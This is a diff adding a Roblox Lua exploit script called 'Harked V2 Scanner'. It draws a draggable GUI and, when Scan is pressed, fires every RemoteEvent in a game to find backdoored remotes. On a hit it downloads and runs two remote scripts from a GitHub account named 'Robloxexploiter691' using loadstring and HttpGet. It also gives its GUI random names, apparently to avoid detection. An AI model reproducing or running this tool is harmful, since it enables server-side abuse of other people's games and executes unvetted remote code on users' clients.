@@ -1,0 +1,254 @@
+-- Instances: 11 | Scripts: 4 | Modules: 0 | Tags: 0
+local G2L = {};
+
+-- StarterGui.HarkScanner
+G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["1"]["Name"] = [[HarkScanner]];
+G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+G2L["1"]["ResetOnSpawn"] = false;
+
+
+-- StarterGui.HarkScanner.Frame
+G2L["2"] = Instance.new("Frame", G2L["1"]);
+G2L["2"]["BorderSizePixel"] = 0;
+G2L["2"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
+G2L["2"]["Size"] = UDim2.new(0, 193, 0, 107);
+G2L["2"]["Position"] = UDim2.new(0.42524, 0, 0.41355, 0);
+G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["2"]["BackgroundTransparency"] = 0.1;
+
+
+-- StarterGui.HarkScanner.Frame.Drag
+G2L["3"] = Instance.new("LocalScript", G2L["2"]);
+G2L["3"]["Name"] = [[Drag]];
+
+
+-- StarterGui.HarkScanner.Frame.LocalScript
+G2L["4"] = Instance.new("LocalScript", G2L["2"]);
+
+
+
+-- StarterGui.HarkScanner.Frame.TextLabel
+G2L["5"] = Instance.new("TextLabel", G2L["2"]);
+G2L["5"]["TextWrapped"] = true;
+G2L["5"]["BorderSizePixel"] = 0;
+G2L["5"]["TextSize"] = 20;
+G2L["5"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
+G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["BackgroundTransparency"] = 1;
+G2L["5"]["RichText"] = true;
+G2L["5"]["Size"] = UDim2.new(0, 166, 0, 50);
+G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["5"]["Text"] = [[Harked V2 Scanner]];
+G2L["5"]["Position"] = UDim2.new(0.07735, 0, -0.00935, 0);
+
+
+-- StarterGui.HarkScanner.Frame.Scan
+G2L["6"] = Instance.new("TextButton", G2L["2"]);
+G2L["6"]["TextWrapped"] = true;
+G2L["6"]["BorderSizePixel"] = 0;
+G2L["6"]["TextSize"] = 14;
+G2L["6"]["TextScaled"] = true;
+G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["BackgroundColor3"] = Color3.fromRGB(43, 43, 43);
+G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["6"]["BackgroundTransparency"] = 0.3;
+G2L["6"]["Size"] = UDim2.new(0, 167, 0, 38);
+G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["6"]["Text"] = [[Scan]];
+G2L["6"]["Name"] = [[Scan]];
+G2L["6"]["Position"] = UDim2.new(0.07216, 0, 0.46296, 0);
+
+
+-- StarterGui.HarkScanner.Frame.Scan.LocalScript
+G2L["7"] = Instance.new("LocalScript", G2L["6"]);
+
+
+
+-- StarterGui.HarkScanner.Frame.Scan.UICorner
+G2L["8"] = Instance.new("UICorner", G2L["6"]);
+
+
+
+-- StarterGui.HarkScanner.Frame.UICorner
+G2L["9"] = Instance.new("UICorner", G2L["2"]);
+
+
+
+-- StarterGui.HarkScanner.Event
+G2L["a"] = Instance.new("BindableEvent", G2L["1"]);
+
+
+
+-- StarterGui.HarkScanner.Event.LocalScript
+G2L["b"] = Instance.new("LocalScript", G2L["a"]);
+
+
+
+-- StarterGui.HarkScanner.Frame.Drag
+local function C_3()
+local script = G2L["3"];
+	local UIS = game:GetService('UserInputService')
+	local frame = script.Parent
+	local dragToggle = nil
+	local dragSpeed = 0.25
+	local dragStart = nil
+	local startPos = nil
+	
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+	
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+	
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
+	
+end;
+task.spawn(C_3);
+-- StarterGui.HarkScanner.Frame.LocalScript
+local function C_4()
+local script = G2L["4"];
+	repeat task.wait() until game:IsLoaded()
+	
+	script.Parent.Parent.Event:Fire(script.Parent.Parent)
+end;
+task.spawn(C_4);
+-- StarterGui.HarkScanner.Frame.Scan.LocalScript
+local function C_7()
+local script = G2L["7"];
+	local Players = game:GetService("Players")
+	
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		local stuff = {
+			AlreadyScanned = false,
+			LocalPlayer = Players.LocalPlayer,
+			tbtext = script.Parent,
+			mgui = script.Parent.Parent.Parent,
+			backdoorfound = false,
+			safetime = 0.265,
+			testpart = Players.LocalPlayer:FindFirstChild("StarterGear") or Players.LocalPlayer.Character:FindFirstChild("Head"),
+			vulnremote = nil
+	
+		}
+		
+		
+		if stuff.AlreadyScanned then return end
+		stuff.AlreadyScanned = true
+		stuff.tbtext.Text = "Scanning"
+		-- // credits for the STRAWBERRY team
+		 -- // times how long it takes to load the script
+		 -- // this will turn to true or false depending on if vuln found
+		 -- // if a remote with a vuln or backdoor is found it will be referenced in this variable
+	
+		 -- // lower will cause faster scan times but it will mess up more and have false positives
+		-- // higher numbers (like 0.25 which is the default) will take longer but be a good scanner
+		-- // 0.25 is the best for all situations and prob wont need to be changed
+		local deletebind = Instance.new("BindableEvent", stuff.LocalPlayer)
+		deletebind.Name = "deletebind"
+		deletebind.Event:Connect(function(item)
+			if stuff.backdoorfound == true then
+				stuff.vulnremote:FireServer(item)
+			end
+		end)
+		
+	
+		local function remoteBackdoored(remote)
+			local function testfire(item)
+				pcall(function()
+					remote:FireServer(item);			
+				end);
+			end
+			local function isDestroyed(obj)
+				return not obj:IsDescendantOf(game)
+			end
+			testfire(stuff.testpart)
+			task.wait(stuff.safetime) -- // slight delay to see if remote reacts
+			print("Harked V2: "..remote.Name.." /isbackdoored: "..tostring(isDestroyed(stuff.testpart)).." / "..remote:GetFullName())
+			if isDestroyed(stuff.testpart) then
+				stuff.vulnremote = remote
+				return true
+			end
+			return false
+		end; -- // checks a remote event for a backdoor or vulnerability by firing it and seeing if it does something
+	 
+		local function scan()
+			if stuff.backdoorfound then return end;
+			for _, v in ipairs(game:GetDescendants()) do
+				if v:IsA("RemoteEvent") then
+					if not v.Parent then continue end
+					if v.Parent.Name == "RobloxReplicatedStorage" then continue end
+					if v.Parent.Name == "DefaultChatSystemChatEvents" then continue end-- // makes it so it scans a lil faster
+					if v ~= nil and v.Parent.Parent ~= nil and v.Parent.Parent.Name == "HDAdminClient" and v.Parent.Name == "Signals" then continue end
+					if v:FindFirstChild("__FUNCTION") or v.Name == "__FUNCTION" then continue end
+					if remoteBackdoored(v) == true then
+						stuff.backdoorfound = true
+						print("Harked V2: found!")
+						return -- // backdoor found so breaks the loop
+					else
+						-- // keeps scanning if a backdoor isent found
+					end -- // tests remote for backdoor
+				end
+			end
+		end -- // scans a place for vulnerable remotes
+	
+		task.wait(2)-- // 2 sec delay before scanning to stop huge lag spike
+		scan() -- // scans the WHOLE game for vuln/backdoored remotes
+		task.wait()
+		if stuff.backdoorfound then
+			-- // loads up the gui
+			stuff.tbtext.Text = "Backdoor found."
+			
+			shared.vulnremote = stuff.vulnremote
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/harked-v2/refs/heads/main/wh.lua"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/harked-v2/refs/heads/main/rayfielduiharked.lua"))()
+			task.wait(5)
+			stuff.mgui:Destroy()
+		else
+			stuff.tbtext.Text = "No backdoor found."
+			task.wait(10)
+			stuff.mgui:Destroy()
+		end;
+	end)
+end;
+task.spawn(C_7);
+-- StarterGui.HarkScanner.Event.LocalScript
+local function C_b()
+local script = G2L["b"];
+	function randomString()
+		local length = math.random(10,20)
+		local array = {}
+		for i = 1, length do
+			array[i] = string.char(math.random(32, 126))
+		end
+		return table.concat(array)
+	end
+	
+	script.Parent.Event:Connect(function(e)
+		e.Name = randomString()
+	end)
+end;
+task.spawn(C_b);
+
+return G2L["1"], require;
